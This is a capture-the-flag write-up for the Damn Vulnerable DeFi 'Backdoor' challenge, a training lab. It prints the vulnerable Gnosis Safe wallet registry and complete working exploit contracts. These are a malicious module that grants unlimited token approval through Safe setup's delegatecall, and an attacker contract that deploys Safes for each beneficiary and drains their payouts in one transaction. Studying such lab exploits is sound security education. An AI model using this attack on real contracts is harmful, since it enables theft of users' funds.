# 11_Backdoor

## Challenge

### Challenge Description

To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.

To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.

Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

Your goal is to take all funds from the registry. In a single transaction.

### Initial Analysis

For this challenge we are only provided with one file which is the WalletRegistry.sol. The WalletRegistry supervises the issuing of tokens to the beneficiaries (if they create a Gnosis Wallet). 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/auth/Ownable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
 *            When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract WalletRegistry is IProxyCreationCallback, Ownable {
    uint256 private constant EXPECTED_OWNERS_COUNT = 1;
    uint256 private constant EXPECTED_THRESHOLD = 1;
    uint256 private constant PAYMENT_AMOUNT = 10 ether;

    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;

    mapping(address => bool) public beneficiaries;

    // owner => wallet
    mapping(address => address) public wallets;

    error NotEnoughFunds();
    error CallerNotFactory();
    error FakeMasterCopy();
    error InvalidInitialization();
    error InvalidThreshold(uint256 threshold);
    error InvalidOwnersCount(uint256 count);
    error OwnerIsNotABeneficiary();
    error InvalidFallbackManager(address fallbackManager);

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress,
        address tokenAddress,
        address[] memory initialBeneficiaries
    ) {
        _initializeOwner(msg.sender);

        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);

        for (uint256 i = 0; i < initialBeneficiaries.length;) {
            unchecked {
                beneficiaries[initialBeneficiaries[i]] = true;
                ++i;
            }
        }
    }

    function addBeneficiary(address beneficiary) external onlyOwner {
        beneficiaries[beneficiary] = true;
    }

    /**
     * @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
     *          setting the registry's address as the callback.
     */
    function proxyCreated(GnosisSafeProxy proxy, address singleton, bytes calldata initializer, uint256)
        external
        override
    {
        if (token.balanceOf(address(this)) < PAYMENT_AMOUNT) { // fail early
            revert NotEnoughFunds();
        }

        address payable walletAddress = payable(proxy);

        // Ensure correct factory and master copy
        if (msg.sender != walletFactory) {
            revert CallerNotFactory();
        }

        if (singleton != masterCopy) {
            revert FakeMasterCopy();
        }

        // Ensure initial calldata was a call to `GnosisSafe::setup`
        if (bytes4(initializer[:4]) != GnosisSafe.setup.selector) {
            revert InvalidInitialization();
        }

        // Ensure wallet initialization is the expected
        uint256 threshold = GnosisSafe(walletAddress).getThreshold();
        if (threshold != EXPECTED_THRESHOLD) {
            revert InvalidThreshold(threshold);
        }

        address[] memory owners = GnosisSafe(walletAddress).getOwners();
        if (owners.length != EXPECTED_OWNERS_COUNT) {
            revert InvalidOwnersCount(owners.length);
        }

        // Ensure the owner is a registered beneficiary
        address walletOwner;
        unchecked {
            walletOwner = owners[0];
        }
        if (!beneficiaries[walletOwner]) {
            revert OwnerIsNotABeneficiary();
        }

        address fallbackManager = _getFallbackManager(walletAddress);
        if (fallbackManager != address(0))
            revert InvalidFallbackManager(fallbackManager);

        // Remove owner as beneficiary
        beneficiaries[walletOwner] = false;

        // Register the wallet under the owner's address
        wallets[walletOwner] = walletAddress;

        // Pay tokens to the newly created wallet
        SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);
    }

    function _getFallbackManager(address payable wallet) private view returns (address) {
        return abi.decode(
            GnosisSafe(wallet).getStorageAt(
                uint256(keccak256("fallback_manager.handler.address")),
                0x20
            ),
            (address)
        );
    }
}
```

Besides this we are also deploying a GnosisSafe (which we can use as a singleton later), a GnosisSafeProxyFactory (that we must use to generate the proxies) and our DamnValuableToken of which we want to steal 40.

## Solution

Although the codebase looked a bit overwhelming to me at the start (I've never seen the Gnosis Library before), the challenge was pretty simple to solve. I started a bit about how you could implement a backdoor into a Gnosis wallet and found this [article](https://blog.openzeppelin.com/backdooring-gnosis-safe-multisig-wallets). It does a great deal of explaining the setup process of Gnosis wallets and also how one can implement a backdoor in one.

### How backdoor?

We can implement a backdoor into a wallet by abusing the setupModules() functionality to execute arbitrary code on behalve of the wallet. In our case it already is sufficient to just set a approval for 10 tokens to the attacker, but we could also implement way more fucntioanlities if we want. This occurs due the case that the wallet does a delegatecall to a address which we can choose. During this delegatecall we can manipulate storage and do external calls with the wallet as msg.sender.

### Implementing the backdoor

As we don't really need to add a full backdoor but just do one call on behalf of the wallet it was pretty easy. I implemented a simple contract, to which the delegatecall will go and it will approve the attacking contract for uint256max tokens on behalve of the safe. This way the attacker contract can transfer out the tokens easily after thesafe has received them "legitimately".

```solidity
contract MaliciousModule {
    function setApprovals(address token, address drainerContract) public
    {
        IERC20(token).approve(drainerContract, type(uint256).max);
    }
}
```

### The final attack

To be able to get the tokens of one user we need to do a few steps:
1. Deploy the malicious module
2. Deploy a proxy on the users behalf and add the data for the setup in the initializer value and the WalletRegistry as the callback
3. Inside the data for the setup we need to set the address of the malicious module as to and the calldata for its setApprovals() function as data
4. Now the safe gets deployed and the malicious module gets run and the approval is set
5. Afterwards the ProxyFactory automatically calls to the registry and as all parameters fit the safe gets the 10 tokens
6. The attacker contract transfers the tokens from the safe to the player

### Doing it all at Once

Our last requirements is that all of the users need to be drained in one transaction. So I decided on doing all of this in a contracts constructor. You can see my implementation below:

```solidity
contract BackdoorAttacker {

    constructor (address token, address proxyFactory, address[] memory users, address _walletRegistry, address _masterContract)
    {
        MaliciousModule maliciousModule = new MaliciousModule();
        GnosisSafeProxyFactory factory = GnosisSafeProxyFactory(proxyFactory);
        
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory user = new address[](1);
            user[0] = users[i];

            bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector, user, 1, address(maliciousModule), abi.encodeWithSignature("setApprovals(address,address)", token, address(this)), address(0), address(0), 0, payable(address(0)));

            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                _masterContract,
                initializer, 
                0,
                IProxyCreationCallback(_walletRegistry)
            );

            IERC20(token).transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }
}
```

### The POC

Finally I needed to run this inside the testfile. as we anyways only have one transaction, this can be done in one function call:

```js
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    await (await ethers.getContractFactory('BackdoorAttacker', player)).deploy(token.address, walletFactory.address, users, walletRegistry.address, masterCopy.address);
});
```

This finally solves the challenge.